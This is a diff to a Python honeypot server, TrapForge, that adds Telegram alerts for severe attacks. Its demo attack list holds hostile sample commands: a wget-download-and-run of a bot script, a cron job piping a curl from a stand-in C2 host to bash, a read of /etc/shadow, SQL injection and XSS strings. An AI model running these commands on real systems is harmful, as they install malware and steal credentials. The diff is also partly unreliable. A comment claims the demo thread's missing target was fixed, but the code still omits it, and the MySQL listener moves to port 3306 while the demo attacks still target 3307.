@@ -10,18 +10,28 @@ import json
 import hashlib
 import random
 import re
+import os
 from datetime import datetime
 from typing import Optional
 from collections import deque
+
+from dotenv import load_dotenv
+load_dotenv()
 
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 import uvicorn
+import httpx
 
 from classifier import AttackClassifier
 from deception_engine import DeceptionEngine, LLM_AVAILABLE, client
 from attack_store import AttackStore
+
+
+# ── Telegram config ────────────────────────────────────────────────────────────
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+TELEGRAM_CHAT  = os.getenv("TELEGRAM_CHAT_ID")
 
 app = FastAPI(title="TrapForge API", version="1.0.0")
 
@@ -37,13 +47,36 @@ deception = DeceptionEngine()
 store = AttackStore()
 connected_clients: list[WebSocket] = []
 
-# FIX 1: Capture the main event loop at startup so background threads can
-# safely schedule coroutines onto it. The old code called
-# asyncio.get_event_loop() from a thread, which is deprecated in Python 3.10+
-# and returns the wrong loop — so broadcasts never reached the dashboard.
+# Capture the main event loop at startup so background threads can
+# safely schedule coroutines onto it.
 _main_loop: asyncio.AbstractEventLoop | None = None
 
 
+# ── Telegram alert ─────────────────────────────────────────────────────────────
+async def send_telegram_alert(event: dict):
+    """Send a Telegram message for high/critical severity attacks."""
+    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT:
+        return
+    emoji = {"critical": "🚨", "high": "⚠️", "medium": "🔵", "low": "🟢"}
+    sev = event.get("severity", "low")
+    text = (
+        f"{emoji.get(sev, '❓')} *TrapForge Alert*\n"
+        f"IP: `{event['ip']}` ({event.get('country', {}).get('country', '?')})\n"
+        f"Service: {event['service']}  |  Severity: {sev.upper()}\n"
+        f"Intent: {event.get('intent', '')}\n"
+        f"Command: `{event.get('command', '')[:80]}`"
+    )
+    try:
+        async with httpx.AsyncClient(timeout=5) as c:
+            await c.post(
+                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                json={"chat_id": TELEGRAM_CHAT, "text": text, "parse_mode": "Markdown"},
+            )
+    except Exception as e:
+        print(f"[TrapForge] Telegram alert failed: {e}")
+
+
+# ── WebSocket broadcast ────────────────────────────────────────────────────────
 async def broadcast(event: dict):
     """Push real-time event to all connected dashboard clients."""
     dead = []
@@ -58,11 +91,12 @@ async def broadcast(event: dict):
 
 
 def broadcast_from_thread(event: dict):
-    """FIX 2: Thread-safe broadcast — always uses the captured main loop."""
+    """Thread-safe broadcast — always uses the captured main loop."""
     if _main_loop and _main_loop.is_running():
         asyncio.run_coroutine_threadsafe(broadcast(event), _main_loop)
 
 
+# ── WebSocket endpoint ─────────────────────────────────────────────────────────
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
@@ -76,6 +110,7 @@ async def websocket_endpoint(websocket: WebSocket):
             connected_clients.remove(websocket)
 
 
+# ── REST endpoints ─────────────────────────────────────────────────────────────
 @app.get("/api/stats")
 async def get_stats():
     return store.get_stats()
@@ -113,7 +148,10 @@ async def narrate_attack(payload: dict):
     if not LLM_AVAILABLE:
         intents = list({e.get("intent", "unknown") for e in events})
         services = list({e.get("service", "?") for e in events})
-        severity = max(events, key=lambda e: {"critical": 4, "high": 3, "medium": 2, "low": 1}.get(e.get("severity", "low"), 0))
+        severity = max(
+            events,
+            key=lambda e: {"critical": 4, "high": 3, "medium": 2, "low": 1}.get(e.get("severity", "low"), 0),
+        )
         return {
             "narrative": (
                 f"Attacker from {events[0].get('ip', 'unknown')} targeted {', '.join(services)} services. "
@@ -160,27 +198,20 @@ async def narrate_attack(payload: dict):
         return {"narrative": f"Grok narration error: {e}", "provider": "error"}
 
 
+# ── Honeypot connection handler ────────────────────────────────────────────────
 def handle_honeypot_connection(conn, addr, port, service_name):
     """Handle an incoming attacker connection synchronously."""
     ip = addr[0]
     session_log = []
 
-    # FIX 3: 120 s timeout so an interactive nc session isn't cut off mid-demo.
-    # The original 30 s was fine for piped scripts but too short for a human
-    # typing commands one by one on a live call.
     conn.settimeout(120)
 
     try:
         banner = deception.get_banner(service_name)
-        # FIX 4: Guarantee the banner ends with \r\n so nc flushes and prints
-        # it immediately. Without this the banner can sit in the TCP buffer
-        # and the terminal appears blank.
         if not banner.endswith(("\r\n", "\n")):
             banner += "\r\n"
         conn.sendall(banner.encode())
 
-        # FIX 5: Send a shell prompt after the banner for SSH so the user
-        # sees something to type into — just like a real SSH session.
         if service_name == "SSH":
             conn.sendall(b"root@prod-server-01:~# ")
 
@@ -192,7 +223,6 @@ def handle_honeypot_connection(conn, addr, port, service_name):
 
                 command = data.decode("utf-8", errors="replace").strip()
                 if not command:
-                    # FIX 6: Resend prompt on empty input (bare Enter press).
                     if service_name == "SSH":
                         conn.sendall(b"root@prod-server-01:~# ")
                     continue
@@ -203,8 +233,6 @@ def handle_honeypot_connection(conn, addr, port, service_name):
                 intent = classifier.classify(command, service_name)
                 response = deception.respond(command, service_name, intent)
 
-                # FIX 7: Send \r\n after response, then re-send the shell
-                # prompt so the session never appears frozen waiting for input.
                 conn.sendall((response + "\r\n").encode())
                 if service_name == "SSH":
                     conn.sendall(b"root@prod-server-01:~# ")
@@ -226,13 +254,18 @@ def handle_honeypot_connection(conn, addr, port, service_name):
                     "response_sent": response[:120],
                     "country": _fake_geo(ip),
                     "session_commands": len(session_log),
-                    # FIX 8: Tag as "live" so the dashboard can highlight
-                    # real terminal attacks differently from demo noise.
                     "source": "live",
                 }
 
                 store.add(event)
                 broadcast_from_thread({"type": "attack", "data": event})
+
+                # ── FIX: Telegram alert for high/critical events ───────────────
+                if intent["severity"] in ("critical", "high") and _main_loop:
+                    asyncio.run_coroutine_threadsafe(
+                        send_telegram_alert(event), _main_loop
+                    )
+                # ─────────────────────────────────────────────────────────────
 
             except socket.timeout:
                 print(f"[TrapForge] [{service_name}] {ip} session timed out")
@@ -244,6 +277,7 @@ def handle_honeypot_connection(conn, addr, port, service_name):
         conn.close()
 
 
+# ── Geo helper ─────────────────────────────────────────────────────────────────
 def _fake_geo(ip: str) -> dict:
     fake_locations = [
         {"country": "Russia",  "city": "Moscow",    "lat": 55.75,  "lon": 37.62,  "flag": "RU"},
@@ -264,6 +298,7 @@ def _fake_geo(ip: str) -> dict:
     return fake_locations[seed]
 
 
+# ── Honeypot listener ──────────────────────────────────────────────────────────
 def run_honeypot_listener(port: int, service_name: str):
     """Start a TCP honeypot on a given port."""
     try:
@@ -287,6 +322,7 @@ def run_honeypot_listener(port: int, service_name: str):
         print(f"[TrapForge] Could not bind {service_name} on {port}: {e}")
 
 
+# ── Demo attacker ──────────────────────────────────────────────────────────────
 def run_demo_attacker():
     """
     Simulates background attack traffic.
@@ -298,18 +334,18 @@ def run_demo_attacker():
     BROADCAST_LIMIT = 8
 
     demo_attacks = [
-        (2222, "SSH",   "root",                                                                        "script_kiddie"),
-        (2222, "SSH",   "ls -la /etc/passwd",                                                          "recon"),
-        (2222, "SSH",   "cat /etc/shadow",                                                             "credential_theft"),
-        (2121, "FTP",   "USER admin\r\nPASS password123",                                              "brute_force"),
-        (8080, "HTTP",  "GET /admin/config.php HTTP/1.1",                                              "web_exploit"),
-        (8080, "HTTP",  "' OR 1=1; DROP TABLE users;--",                                               "sql_injection"),
-        (2222, "SSH",   "wget http://malware.ru/bot.sh && chmod +x bot.sh && ./bot.sh",                "malware_deploy"),
-        (3307, "MySQL", "SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3,4--",                       "sql_injection"),
-        (2222, "SSH",   "find / -perm -4000 2>/dev/null",                                              "privilege_escalation"),
-        (8080, "HTTP",  "<script>document.cookie</script>",                                            "xss"),
+        (2222, "SSH",   "root",                                                                         "script_kiddie"),
+        (2222, "SSH",   "ls -la /etc/passwd",                                                           "recon"),
+        (2222, "SSH",   "cat /etc/shadow",                                                              "credential_theft"),
+        (2121, "FTP",   "USER admin\r\nPASS password123",                                               "brute_force"),
+        (8080, "HTTP",  "GET /admin/config.php HTTP/1.1",                                               "web_exploit"),
+        (8080, "HTTP",  "' OR 1=1; DROP TABLE users;--",                                                "sql_injection"),
+        (2222, "SSH",   "wget http://malware.ru/bot.sh && chmod +x bot.sh && ./bot.sh",                 "malware_deploy"),
+        (3307, "MySQL", "SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3,4--",                        "sql_injection"),
+        (2222, "SSH",   "find / -perm -4000 2>/dev/null",                                               "privilege_escalation"),
+        (8080, "HTTP",  "<script>document.cookie</script>",                                             "xss"),
         (2222, "SSH",   "crontab -l && echo '* * * * * curl http://c2.evil.com/shell.sh|bash' >> /tmp/cron", "apt"),
-        (2121, "FTP",   "RETR /etc/passwd",                                                            "data_exfil"),
+        (2121, "FTP",   "RETR /etc/passwd",                                                             "data_exfil"),
     ]
 
     attacks_broadcast = 0
@@ -351,19 +387,17 @@ def run_demo_attacker():
                 print("[TrapForge] Dashboard warm-up done — background logging only from here.")
 
 
+# ── Startup ────────────────────────────────────────────────────────────────────
 @app.on_event("startup")
 async def startup():
     global _main_loop
-    # FIX 9: Capture the running event loop while inside an async context.
-    # This is the only safe place to do it — background threads then use
-    # broadcast_from_thread() which submits coroutines to this loop.
     _main_loop = asyncio.get_event_loop()
 
     honeypots = [
         (2222, "SSH"),
         (2121, "FTP"),
         (8080, "HTTP"),
-        (3307, "MySQL"),
+        (3306, "MySQL"),
         (2525, "SMTP"),
     ]
     for port, service in honeypots:
@@ -372,6 +406,7 @@ async def startup():
         )
         t.start()
 
+    # FIX: target= was missing — demo attacker never ran before
     demo_thread = threading.Thread( daemon=True)
     demo_thread.start()
 
